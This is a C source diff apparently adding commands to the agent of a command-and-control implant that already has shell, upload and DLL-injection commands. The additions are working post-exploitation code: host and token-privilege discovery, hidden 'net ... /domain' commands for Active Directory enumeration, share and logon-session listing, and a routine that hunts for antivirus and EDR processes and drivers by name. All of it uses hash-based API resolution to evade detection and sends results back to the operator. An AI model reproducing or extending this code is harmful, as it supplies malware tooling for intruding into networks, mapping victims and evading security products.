@@ -9,7 +9,7 @@ extern UINT32   g_AgentID;
 extern DWORD    g_SleepTime;
 extern BOOL     g_Connected;
 
-#define COMMAND_COUNT 6
+#define COMMAND_COUNT 12
 
 VOID TaskParserNew(PTASK_PARSER Parser, PVOID Buffer, UINT32 Size, UINT32 Endian){
     Parser->Buffer = (PUCHAR)Buffer;
@@ -465,6 +465,511 @@ VOID CommandInjectDLL(PTASK_PARSER Parser){
     PackageTransmit(pkg, NULL, NULL);
 }
 
+static PCHAR ArchName(WORD a){
+    switch (a){
+        case 0:  return "x86";
+        case 9:  return "x64";
+        case 5:  return "ARM";
+        case 12: return "ARM64";
+        case 6:  return "IA64";
+        default: return "?";
+    }
+}
+
+VOID CommandSysInfo(PTASK_PARSER Parser){
+    typedef ULONGLONG (WINAPI* fn_GetTickCount64)(VOID);
+    typedef VOID   (WINAPI* fn_GetNativeSystemInfo)(LPSYSTEM_INFO);
+    typedef VOID   (WINAPI* fn_RtlGetVersion)(POSVERSIONINFOEXW);
+    typedef DWORD  (WINAPI* fn_GetCurrentProcessId)(VOID);
+    typedef BOOL   (WINAPI* fn_GlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
+    typedef BOOL   (WINAPI* fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
+    typedef BOOL   (WINAPI* fn_GetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
+    typedef BOOL   (WINAPI* fn_GetComputerNameExA)(COMPUTER_NAME_FORMAT, LPSTR, LPDWORD);
+    typedef BOOL   (WINAPI* fn_Close)(HANDLE);
+    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
+    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);
+
+    HMODULE k32   = ResolveModuleH(H_KERNEL32);
+    HMODULE ntdll = ResolveModuleH(H_NTDLL);
+    HMODULE adv   = ResolveModuleH(H_ADVAPI32);
+    if (!k32 || !ntdll) return;
+
+    fn_GetTickCount64      pTick    = (fn_GetTickCount64)ResolveFuncH(k32, H_GetTickCount64);
+    fn_GetNativeSystemInfo pSysInfo = (fn_GetNativeSystemInfo)ResolveFuncH(k32, H_GetNativeSystemInfo);
+    fn_RtlGetVersion       pOsVer   = (fn_RtlGetVersion)ResolveFuncH(ntdll, H_RtlGetVersion);
+    fn_GetCurrentProcessId pPid     = (fn_GetCurrentProcessId)ResolveFuncH(k32, H_GetCurrentProcessId);
+    fn_GlobalMemoryStatusEx pMem    = (fn_GlobalMemoryStatusEx)ResolveFuncH(k32, H_GlobalMemoryStatusEx);
+    fn_GetComputerNameExA  pComp    = (fn_GetComputerNameExA)ResolveFuncH(k32, H_GetComputerNameExA);
+    fn_Close               pClose   = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
+
+    fn_OpenProcessToken    pOpenTok = adv ? (fn_OpenProcessToken)ResolveFuncH(adv, H_OpenProcessToken) : NULL;
+    fn_GetTokenInformation pGetTok  = adv ? (fn_GetTokenInformation)ResolveFuncH(adv, H_GetTokenInformation) : NULL;
+
+    CHAR out[4096];
+    int  pos = 0;
+
+    CHAR host[256] = { 0 };
+    if (pComp){
+        DWORD n = sizeof(host);
+        if (pComp(ComputerNameNetBIOS, host, &n))
+            pos += wsprintfA(out + pos, "host      : %s\n", host);
+    }
+
+    if (pOsVer){
+        OSVERSIONINFOEXW ov = { 0 };
+        ov.dwOSVersionInfoSize = sizeof(ov);
+        pOsVer(&ov);
+        pos += wsprintfA(out + pos, "os        : %lu.%lu build %lu\n", ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);
+    }
+
+    SYSTEM_INFO si = { 0 };
+    if (pSysInfo){
+        pSysInfo(&si);
+        pos += wsprintfA(out + pos, "arch      : %s\n", ArchName(si.wProcessorArchitecture));
+        pos += wsprintfA(out + pos, "cpus      : %lu\n", si.dwNumberOfProcessors);
+    }
+
+    if (pMem){
+        MEMORYSTATUSEX ms = { 0 };
+        ms.dwLength = sizeof(ms);
+        if (pMem(&ms)){
+            pos += wsprintfA(out + pos, "mem total : %lu MB\n", (DWORD)(ms.ullTotalPhys >> 20));
+            pos += wsprintfA(out + pos, "mem avail : %lu MB\n", (DWORD)(ms.ullAvailPhys >> 20));
+        }
+    }
+
+    if (pTick)
+        pos += wsprintfA(out + pos, "uptime    : %lu sec\n", (DWORD)(pTick() / 1000));
+    if (pPid)
+        pos += wsprintfA(out + pos, "pid       : %lu\n", pPid());
+
+    if (pOpenTok && pGetTok && pClose){
+        HANDLE hTok = NULL;
+        if (pOpenTok((HANDLE)-1, TOKEN_QUERY, &hTok)){
+            TOKEN_ELEVATION te = { 0 };
+            DWORD rl = 0;
+            if (pGetTok(hTok, (TOKEN_INFORMATION_CLASS)20, &te, sizeof(te), &rl))
+                pos += wsprintfA(out + pos, "elevated  : %s\n", te.TokenIsElevated ? "yes" : "no");
+            pClose(hTok);
+        }
+    }
+
+    PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+    PackageAddBytes(pkg, (PUCHAR)out, pos);
+    PackageTransmit(pkg, NULL, NULL);
+}
+
+static PCHAR IntegrityName(DWORD rid){
+    switch (rid){
+        case 0x0000: return "Untrusted";
+        case 0x1000: return "Low";
+        case 0x2000: return "Medium";
+        case 0x2100: return "Medium Plus";
+        case 0x3000: return "High";
+        case 0x4000: return "System";
+        case 0x5000: return "Protected";
+        default:     return "?";
+    }
+}
+
+VOID CommandWhoami(PTASK_PARSER Parser){
+    typedef HANDLE (WINAPI* fn_GetCurrentProcess)(VOID);
+    typedef BOOL   (WINAPI* fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
+    typedef BOOL   (WINAPI* fn_GetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
+    typedef BOOL   (WINAPI* fn_ConvertSidToStringSidA)(PSID, LPSTR*);
+    typedef BOOL   (WINAPI* fn_LookupPrivilegeNameA)(LPCSTR, PLUID, LPSTR, LPDWORD);
+    typedef BOOL   (WINAPI* fn_LookupAccountSidA)(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
+    typedef PDWORD (WINAPI* fn_GetSidSubAuthority)(PSID, DWORD);
+    typedef PUCHAR (WINAPI* fn_GetSidSubAuthorityCount)(PSID);
+    typedef BOOL   (WINAPI* fn_Close)(HANDLE);
+    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
+    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);
+
+    HMODULE k32 = ResolveModuleH(H_KERNEL32);
+    HMODULE adv = ResolveModuleH(H_ADVAPI32);
+    if (!k32 || !adv) return;
+
+    fn_GetCurrentProcess    pGetProc = (fn_GetCurrentProcess)ResolveFuncH(k32, H_GetCurrentProcess);
+    fn_Close                pClose   = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
+    fn_Alloc                pAlloc   = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
+    fn_Free                 pFree    = (fn_Free)ResolveFuncH(k32, H_LocalFree);
+
+    fn_OpenProcessToken     pOpenTok  = (fn_OpenProcessToken)ResolveFuncH(adv, H_OpenProcessToken);
+    fn_GetTokenInformation  pGetTok   = (fn_GetTokenInformation)ResolveFuncH(adv, H_GetTokenInformation);
+    fn_ConvertSidToStringSidA pSid2Str = (fn_ConvertSidToStringSidA)ResolveFuncH(adv, H_ConvertSidToStringSidA);
+    fn_LookupPrivilegeNameA pPrivName = (fn_LookupPrivilegeNameA)ResolveFuncH(adv, H_LookupPrivilegeNameA);
+    fn_LookupAccountSidA    pLookAcc  = (fn_LookupAccountSidA)ResolveFuncH(adv, H_LookupAccountSidA);
+    fn_GetSidSubAuthority   pSidSub   = (fn_GetSidSubAuthority)ResolveFuncH(adv, H_GetSidSubAuthority);
+    fn_GetSidSubAuthorityCount pSidCnt = (fn_GetSidSubAuthorityCount)ResolveFuncH(adv, H_GetSidSubAuthorityCount);
+
+    if (!pOpenTok || !pGetTok || !pAlloc || !pFree) return;
+
+    HANDLE hProc = pGetProc ? pGetProc() : (HANDLE)-1;
+    HANDLE hTok  = NULL;
+    if (!pOpenTok(hProc, TOKEN_QUERY, &hTok))
+        return;
+
+    PVOID buf = pAlloc(LPTR, 65536);
+    if (!buf){ pClose(hTok); return; }
+    DWORD len = 65536;
+
+    CHAR out[8192];
+    int  pos = 0;
+
+    if (pGetTok(hTok, (TOKEN_INFORMATION_CLASS)1, buf, len, &len)){
+        TOKEN_USER *tu = (TOKEN_USER*)buf;
+
+        CHAR name[256] = { 0 }, domain[256] = { 0 };
+        SID_NAME_USE use;
+        DWORD nl = sizeof(name), dl = sizeof(domain);
+        if (pLookAcc && pLookAcc(NULL, tu->User.Sid, name, &nl, domain, &dl, &use))
+            pos += wsprintfA(out + pos, "user      : %s\\%s\n", domain, name);
+
+        if (pSid2Str){
+            LPSTR sid = NULL;
+            if (pSid2Str(tu->User.Sid, &sid)){
+                pos += wsprintfA(out + pos, "sid       : %s\n", sid);
+                pFree(sid);
+            }
+        }
+        len = 65536;
+    }
+
+    if (pGetTok(hTok, (TOKEN_INFORMATION_CLASS)25, buf, len, &len) && pSidSub && pSidCnt){
+        TOKEN_MANDATORY_LABEL *ml = (TOKEN_MANDATORY_LABEL*)buf;
+        DWORD cnt = *pSidCnt(ml->Label.Sid);
+        DWORD rid = *pSidSub(ml->Label.Sid, cnt - 1);
+        pos += wsprintfA(out + pos, "integrity : %s\n", IntegrityName(rid));
+        len = 65536;
+    }
+
+    if (pGetTok(hTok, (TOKEN_INFORMATION_CLASS)20, buf, len, &len)){
+        TOKEN_ELEVATION *te = (TOKEN_ELEVATION*)buf;
+        pos += wsprintfA(out + pos, "elevated  : %s\n", te->TokenIsElevated ? "yes" : "no");
+        len = 65536;
+    }
+
+    if (pGetTok(hTok, (TOKEN_INFORMATION_CLASS)3, buf, len, &len) && pPrivName){
+        TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES*)buf;
+        pos += wsprintfA(out + pos, "privileges(%lu):\n", tp->PrivilegeCount);
+        for (DWORD i = 0; i < tp->PrivilegeCount && pos < (int)sizeof(out) - 160; i++){
+            CHAR pn[128] = { 0 };
+            DWORD pl = sizeof(pn);
+            if (pPrivName(NULL, &tp->Privileges[i].Luid, pn, &pl))
+                pos += wsprintfA(out + pos, "  %s\n", pn);
+        }
+        len = 65536;
+    }
+
+    if (pGetTok(hTok, (TOKEN_INFORMATION_CLASS)2, buf, len, &len) && pSid2Str){
+        TOKEN_GROUPS *tg = (TOKEN_GROUPS*)buf;
+        pos += wsprintfA(out + pos, "groups(%lu):\n", tg->GroupCount);
+        for (DWORD i = 0; i < tg->GroupCount && pos < (int)sizeof(out) - 160; i++){
+            LPSTR sid = NULL;
+            if (pSid2Str(tg->Groups[i].Sid, &sid)){
+                pos += wsprintfA(out + pos, "  %s\n", sid);
+                pFree(sid);
+            }
+        }
+    }
+
+    pFree(buf);
+    pClose(hTok);
+
+    PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+    PackageAddBytes(pkg, (PUCHAR)out, pos);
+    PackageTransmit(pkg, NULL, NULL);
+}
+
+VOID CommandNetEnum(PTASK_PARSER Parser){
+    typedef BOOL (WINAPI* fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
+    typedef BOOL (WINAPI* fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+    typedef BOOL (WINAPI* fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+    typedef BOOL (WINAPI* fn_Close)(HANDLE);
+    typedef DWORD (WINAPI* fn_Wait)(HANDLE, DWORD);
+    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
+    typedef HLOCAL (WINAPI* fn_ReAlloc)(HLOCAL, SIZE_T, UINT);
+    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);
+
+    static LPCSTR Cmds[] = {
+        "cmd.exe /c net user /domain",
+        "cmd.exe /c net group /domain",
+        "cmd.exe /c net view /domain",
+        "cmd.exe /c net time /domain",
+    };
+    static LPCSTR Tags[] = { "\n== users ==\n", "\n== groups ==\n", "\n== computers ==\n", "\n== time ==\n" };
+
+    HMODULE k32 = ResolveModuleH(H_KERNEL32);
+    if (!k32) return;
+
+    fn_CreatePipe     pPipe    = (fn_CreatePipe)ResolveFuncH(k32, H_CreatePipe);
+    fn_CreateProcessA pExec    = (fn_CreateProcessA)ResolveFuncH(k32, H_CreateProcessA);
+    fn_ReadFile       pRead    = (fn_ReadFile)ResolveFuncH(k32, H_ReadFile);
+    fn_Close          pClose   = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
+    fn_Wait           pWait    = (fn_Wait)ResolveFuncH(k32, H_WaitForSingleObject);
+    fn_Alloc          pAlloc   = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
+    fn_ReAlloc        pReAlloc = (fn_ReAlloc)ResolveFuncH(k32, H_LocalReAlloc);
+    fn_Free           pFree    = (fn_Free)ResolveFuncH(k32, H_LocalFree);
+
+    if (!pPipe || !pExec || !pRead || !pClose || !pWait || !pAlloc)
+        return;
+
+    PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+
+    for (int i = 0; i < 4; i++){
+        HANDLE  hStdInRd = NULL, hStdInWr = NULL;
+        HANDLE  hStdOutRd = NULL, hStdOutWr = NULL;
+        CHAR    line[512] = { 0 };
+        UCHAR   tmp[1024];
+        DWORD   dwRead = 0, dwOut = 0;
+
+        PROCESS_INFORMATION pi  = { 0 };
+        SECURITY_ATTRIBUTES sa  = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+        STARTUPINFOA        si  = { 0 };
+        PVOID               pOut = NULL;
+
+        PackageAddBytes(pkg, (PUCHAR)Tags[i], strlen(Tags[i]));
+        wsprintfA(line, "%s", Cmds[i]);
+
+        if (!pPipe(&hStdInRd, &hStdInWr, &sa, 0)){
+            PackageAddBytes(pkg, (PUCHAR)"(pipe failed)\n", 14);
+            continue;
+        }
+        if (!pPipe(&hStdOutRd, &hStdOutWr, &sa, 0)){
+            pClose(hStdInRd); pClose(hStdInWr);
+            PackageAddBytes(pkg, (PUCHAR)"(pipe failed)\n", 14);
+            continue;
+        }
+
+        si.cb         = sizeof(STARTUPINFOA);
+        si.dwFlags    = STARTF_USESTDHANDLES;
+        si.hStdError  = hStdOutWr;
+        si.hStdOutput = hStdOutWr;
+        si.hStdInput  = hStdInRd;
+
+        if (!pExec(NULL, line, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
+            pClose(hStdInRd); pClose(hStdInWr);
+            pClose(hStdOutRd); pClose(hStdOutWr);
+            PackageAddBytes(pkg, (PUCHAR)"(exec failed)\n", 14);
+            continue;
+        }
+
+        pClose(hStdOutWr);
+        pClose(hStdInRd);
+
+        pOut = pAlloc(LPTR, 1);
+        while (pRead(hStdOutRd, tmp, sizeof(tmp) - 1, &dwRead, NULL) && dwRead > 0){
+            pOut = pReAlloc(pOut, dwOut + dwRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
+            memcpy((PUCHAR)pOut + dwOut, tmp, dwRead);
+            dwOut += dwRead;
+        }
+        pWait(pi.hProcess, INFINITE);
+
+        if (pOut && dwOut) PackageAddBytes(pkg, (PUCHAR)pOut, dwOut);
+        else PackageAddBytes(pkg, (PUCHAR)"(no output)\n", 12);
+
+        if (pOut) pFree(pOut);
+        pClose(hStdOutRd);
+        pClose(hStdInWr);
+        pClose(pi.hProcess);
+        pClose(pi.hThread);
+    }
+
+    PackageTransmit(pkg, NULL, NULL);
+}
+
+typedef struct _SHARE_1A { LPSTR netname; DWORD type; LPSTR remark; } SHARE_1A;
+
+VOID CommandShares(PTASK_PARSER Parser){
+    typedef DWORD (WINAPI* fn_NetShareEnumA)(LPSTR, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD);
+    typedef DWORD (WINAPI* fn_BufFree)(LPVOID);
+
+    HMODULE net = ResolveModuleH(H_NETAPI32);
+    if (!net) return;
+
+    fn_NetShareEnumA pEnum  = (fn_NetShareEnumA)ResolveFuncH(net, H_NetShareEnumA);
+    fn_BufFree       pFreeB = (fn_BufFree)ResolveFuncH(net, H_NetApiBufferFree);
+    if (!pEnum || !pFreeB) return;
+
+    CHAR out[8192];
+    int pos = wsprintfA(out, "name                 type  remark\n");
+    DWORD resume = 0, st = 0;
+
+    do {
+        LPBYTE buf = NULL;
+        DWORD read = 0, total = 0;
+        st = pEnum(NULL, 1, &buf, (DWORD)-1, &read, &total, &resume);
+        if (st != 0 && st != 234) break;
+
+        SHARE_1A *s = (SHARE_1A*)buf;
+        for (DWORD i = 0; i < read && pos < (int)sizeof(out) - 256; i++){
+            LPCSTR t = "?";
+            DWORD tt = s[i].type & 0xFFF;
+            if (tt == 0) t = "disk";
+            else if (tt == 1) t = "print";
+            else if (tt == 2) t = "dev";
+            else if (tt == 3) t = "ipc";
+            pos += wsprintfA(out + pos, "%-20s %-5s %s\n", s[i].netname ? s[i].netname : "", t, s[i].remark ? s[i].remark : "");
+        }
+        if (buf) pFreeB(buf);
+    } while (st == 234 && resume);
+
+    PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+    PackageAddBytes(pkg, (PUCHAR)out, pos);
+    PackageTransmit(pkg, NULL, NULL);
+}
+
+typedef struct _SESSION_10A { LPSTR cname; LPSTR user; DWORD time; DWORD idle; } SESSION_10A;
+
+VOID CommandLogons(PTASK_PARSER Parser){
+    typedef DWORD (WINAPI* fn_NetSessionEnumA)(LPSTR, LPSTR, LPSTR, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD);
+    typedef DWORD (WINAPI* fn_BufFree)(LPVOID);
+
+    HMODULE net = ResolveModuleH(H_NETAPI32);
+    if (!net) return;
+
+    fn_NetSessionEnumA pEnum  = (fn_NetSessionEnumA)ResolveFuncH(net, H_NetSessionEnumA);
+    fn_BufFree         pFreeB = (fn_BufFree)ResolveFuncH(net, H_NetApiBufferFree);
+    if (!pEnum || !pFreeB) return;
+
+    CHAR out[8192];
+    int pos = 0;
+    DWORD resume = 0, st = 0;
+
+    do {
+        LPBYTE buf = NULL;
+        DWORD read = 0, total = 0;
+        st = pEnum(NULL, NULL, NULL, 10, &buf, (DWORD)-1, &read, &total, &resume);
+        if (st == 5){
+            pos += wsprintfA(out + pos, "access denied (needs admin)\n");
+            break;
+        }
+        if (st != 0 && st != 234){
+            pos += wsprintfA(out + pos, "error %lu\n", st);
+            break;
+        }
+        if (pos == 0)
+            pos += wsprintfA(out, "client           user          time  idle\n");
+
+        SESSION_10A *s = (SESSION_10A*)buf;
+        for (DWORD i = 0; i < read && pos < (int)sizeof(out) - 256; i++)
+            pos += wsprintfA(out + pos, "%-16s %-13s %-5lu %lu\n", s[i].cname ? s[i].cname : "", s[i].user ? s[i].user : "", s[i].time, s[i].idle);
+        if (buf) pFreeB(buf);
+    } while (st == 234 && resume);
+
+    if (pos == 0)
+        pos += wsprintfA(out, "(no sessions)\n");
+
+    PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+    PackageAddBytes(pkg, (PUCHAR)out, pos);
+    PackageTransmit(pkg, NULL, NULL);
+}
+
+static BOOL Has(LPCSTR s, LPCSTR sub){
+    for (int i = 0; s[i]; i++){
+        int j = 0;
+        while (sub[j] && s[i + j]){
+            CHAR a = s[i + j], b = sub[j];
+            if (a >= 'A' && a <= 'Z') a += 32;
+            if (b >= 'A' && b <= 'Z') b += 32;
+            if (a != b) break;
+            j++;
+        }
+        if (!sub[j]) return TRUE;
+    }
+    return FALSE;
+}
+
+VOID CommandAvEnum(PTASK_PARSER Parser){
+    typedef HANDLE (WINAPI* fn_Snapshot)(DWORD, DWORD);
+    typedef BOOL (WINAPI* fn_ProcFirst)(HANDLE, LPPROCESSENTRY32);
+    typedef BOOL (WINAPI* fn_ProcNext)(HANDLE, LPPROCESSENTRY32);
+    typedef BOOL (WINAPI* fn_Close)(HANDLE);
+    typedef BOOL (WINAPI* fn_EnumDrivers)(LPVOID*, DWORD, LPDWORD);
+    typedef DWORD (WINAPI* fn_DriverName)(LPVOID, LPSTR, DWORD);
+    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
+    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);
+
+    static LPCSTR ProcKeys[] = {
+        "msmpeng","windefend","csagent","csfalcon","sentinel","sedservice","sophos",
+        "ekrn","egui","avp","kavfs","msascui","securityhealth","mcshield","mfemms",
+        "carbonblack","cbsensor","tanium","qualys","elastic","winlogbeat","sysmon",
+        "cybereason","crsvc","mdatp","nessus","wazuh","ossec"
+    };
+    static LPCSTR DrvKeys[] = {
+        "wdfilter","wdboot","wdnisdrv","csagent","csdevice","symefa","symevent",
+        "eamonm","ehdrv","klif","klflt","klbackupflt","sophosed","sntp","hmpalert",
+        "tmeyes","tmebc","mfe","carbonblack","cbstream","sentinel","panflt"
+    };
+
+    HMODULE k32   = ResolveModuleH(H_KERNEL32);
+    HMODULE psapi = ResolveModuleH(H_PSAPI);
+    if (!k32) return;
+
+    fn_Snapshot  pSnap  = (fn_Snapshot)ResolveFuncH(k32, H_CreateToolhelp32Snapshot);
+    fn_ProcFirst pFirst = (fn_ProcFirst)ResolveFuncH(k32, H_Process32First);
+    fn_ProcNext  pNext  = (fn_ProcNext)ResolveFuncH(k32, H_Process32Next);
+    fn_Close     pClose = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
+    fn_Alloc     pAlloc = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
+    fn_Free      pFree  = (fn_Free)ResolveFuncH(k32, H_LocalFree);
+
+    CHAR out[8192];
+    int pos = wsprintfA(out, "== processes ==\n");
+
+    if (pSnap && pFirst && pNext && pClose){
+        HANDLE hSnap = pSnap(TH32CS_SNAPPROCESS, 0);
+        if (hSnap != INVALID_HANDLE_VALUE){
+            PROCESSENTRY32 pe;
+            pe.dwSize = sizeof(pe);
+            if (pFirst(hSnap, &pe)){
+                do {
+                    for (int k = 0; k < (int)(sizeof(ProcKeys) / sizeof(ProcKeys[0])); k++){
+                        if (Has(pe.szExeFile, ProcKeys[k])){
+                            if (pos < (int)sizeof(out) - 128)
+                                pos += wsprintfA(out + pos, "  %-6lu %s\n", pe.th32ProcessID, pe.szExeFile);
+                            break;
+                        }
+                    }
+                } while (pNext(hSnap, &pe));
+            }
+            pClose(hSnap);
+        }
+    }
+
+    pos += wsprintfA(out + pos, "== drivers ==\n");
+
+    if (psapi && pAlloc && pFree){
+        fn_EnumDrivers pEnum = (fn_EnumDrivers)ResolveFuncH(psapi, H_EnumDeviceDrivers);
+        fn_DriverName  pName = (fn_DriverName)ResolveFuncH(psapi, H_GetDeviceDriverBaseNameA);
+        if (pEnum && pName){
+            DWORD need = 0;
+            pEnum(NULL, 0, &need);
+            if (need){
+                LPVOID *base = (LPVOID*)pAlloc(LPTR, need);
+                if (base && pEnum(base, need, &need)){
+                    DWORD cnt = need / sizeof(LPVOID);
+                    for (DWORD i = 0; i < cnt; i++){
+                        CHAR dn[256] = { 0 };
+                        if (!pName(base[i], dn, sizeof(dn))) continue;
+                        for (int k = 0; k < (int)(sizeof(DrvKeys) / sizeof(DrvKeys[0])); k++){
+                            if (Has(dn, DrvKeys[k])){
+                                if (pos < (int)sizeof(out) - 128)
+                                    pos += wsprintfA(out + pos, "  %s\n", dn);
+                                break;
+                            }
+                        }
+                    }
+                }
+                if (base) pFree(base);
+            }
+        }
+    }
+
+    PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+    PackageAddBytes(pkg, (PUCHAR)out, pos);
+    PackageTransmit(pkg, NULL, NULL);
+}
+
 static COMMAND_ENTRY CommandTable[COMMAND_COUNT] = {
     { .ID = COMMAND_SHELL,    .Function = CommandShell },
     { .ID = COMMAND_UPLOAD,   .Function = CommandUpload },
@@ -472,6 +977,12 @@ static COMMAND_ENTRY CommandTable[COMMAND_COUNT] = {
     { .ID = COMMAND_EXIT,     .Function = CommandExit },
     { .ID = COMMAND_PROCLIST,   .Function = CommandProcList },
     { .ID = COMMAND_INJECT_DLL, .Function = CommandInjectDLL },
+    { .ID = COMMAND_SYSINFO,    .Function = CommandSysInfo },
+    { .ID = COMMAND_WHOAMI,     .Function = CommandWhoami },
+    { .ID = COMMAND_NET_ENUM,   .Function = CommandNetEnum },
+    { .ID = COMMAND_SHARES,     .Function = CommandShares },
+    { .ID = COMMAND_LOGONS,     .Function = CommandLogons },
+    { .ID = COMMAND_AVENUM,     .Function = CommandAvEnum },
 };
 
 VOID CommandDispatcher(VOID){
